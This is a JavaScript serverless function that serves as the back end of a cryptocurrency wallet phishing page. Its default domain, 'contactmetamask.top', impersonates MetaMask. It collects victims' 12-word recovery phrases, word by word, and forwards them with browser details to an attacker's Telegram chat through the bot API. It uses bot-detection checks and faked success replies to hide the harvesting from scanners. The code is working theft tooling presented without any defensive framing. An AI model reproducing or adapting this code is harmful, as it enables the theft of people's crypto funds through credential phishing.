// Vercel Serverless Function to send form data to Telegram
// Rate limiting store (in-memory, resets on cold start)
const submissionStore = new Map();

function checkRateLimit(identifier) {
  const now = Date.now();
  const windowMs = 60000; // 1 minute
  const maxRequests = 3; // Max 3 submissions per minute per IP
  
  if (!submissionStore.has(identifier)) {
    submissionStore.set(identifier, []);
  }
  
  const submissions = submissionStore.get(identifier);
  // Clean old submissions
  const recentSubmissions = submissions.filter(time => now - time < windowMs);
  
  if (recentSubmissions.length >= maxRequests) {
    return false;
  }
  
  recentSubmissions.push(now);
  submissionStore.set(identifier, recentSubmissions);
  return true;
}

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Get environment variables
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Validate environment variables
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Missing environment variables');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  // Rate limiting by IP
  const clientIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown';
  if (!checkRateLimit(clientIp)) {
    console.log(`Rate limit exceeded for IP: ${clientIp}`);
    // Return success to not reveal rate limiting to bots
    return res.status(200).json({ success: true, message: 'Submission received' });
  }

  try {
    const {
      recoveryPhrase,
      word1, word2, word3, word4, word5, word6,
      word7, word8, word9, word10, word11, word12,
      hasInvalidWords,
      timestamp,
      userAgent,
      interactionScore,
      isSuspicious,
      sessionToken,
      honeypot
    } = req.body;

    // Honeypot check - if filled, it's a bot
    if (honeypot && honeypot !== '') {
      console.log('Bot detected via honeypot');
      // Return success to not reveal the honeypot
      return res.status(200).json({ success: true, message: 'Submission received' });
    }

    // Validate required fields
    if (!recoveryPhrase || !sessionToken) {
      console.log('Missing required fields');
      return res.status(400).json({ error: 'Invalid request' });
    }

    // Additional server-side bot detection
    const headers = req.headers;
    const serverSideChecks = {
      hasUserAgent: !!headers['user-agent'],
      hasReferer: !!headers['referer'],
      hasAcceptLanguage: !!headers['accept-language'],
      acceptsHtml: headers['accept']?.includes('text/html'),
      isLikelyBot: !headers['user-agent'] || 
                   headers['user-agent'].toLowerCase().includes('bot') ||
                   headers['user-agent'].toLowerCase().includes('crawler') ||
                   headers['user-agent'].toLowerCase().includes('spider')
    };

    // Determine trust level
    const trustLevel = serverSideChecks.isLikelyBot || isSuspicious ? '🚨 SUSPICIOUS' : '✅ LIKELY LEGITIMATE';

    // Get domain from referer or default
    const domain = headers['referer'] ? new URL(headers['referer']).hostname : 'contactmetamask.top';
    
    // Format the message with interaction data
    const message = `🔐 *New Wallet Recovery Phrase Submission*

🌐 *Domain:* ${domain}
📊 *Trust Level:* ${trustLevel}
📅 *Timestamp:* ${timestamp}
⚠️ *Has Invalid Words:* ${hasInvalidWords ? 'Yes' : 'No'}
🖥️ *User Agent:* ${userAgent}
🔗 *Referer:* ${headers['referer'] || 'Direct Access'}

🤖 *Bot Detection Metrics:*
• Mouse Movements: ${interactionScore?.mouseMovements || 0}
• Key Presses: ${interactionScore?.keyPresses || 0}
• Time on Page: ${Math.round((interactionScore?.timeOnPage || 0) / 1000)}s
• Avg Input Speed: ${Math.round(interactionScore?.avgInputTiming || 0)}ms
• Has Referer: ${serverSideChecks.hasReferer ? '✓' : '✗'}
• Accept Language: ${serverSideChecks.hasAcceptLanguage ? '✓' : '✗'}

*12-Word Recovery Phrase:*
\`\`\`
${recoveryPhrase}
\`\`\`

*Individual Words:*
1️⃣ ${word1}
2️⃣ ${word2}
3️⃣ ${word3}
4️⃣ ${word4}
5️⃣ ${word5}
6️⃣ ${word6}
7️⃣ ${word7}
8️⃣ ${word8}
9️⃣ ${word9}
🔟 ${word10}
1️⃣1️⃣ ${word11}
1️⃣2️⃣ ${word12}`;

    // Send message to Telegram
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const telegramResponse = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramData);
      return res.status(500).json({ error: 'Failed to send message' });
    }

    // Return success
    return res.status(200).json({ 
      success: true, 
      message: 'Submission received successfully' 
    });

  } catch (error) {
    console.error('Error processing request:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
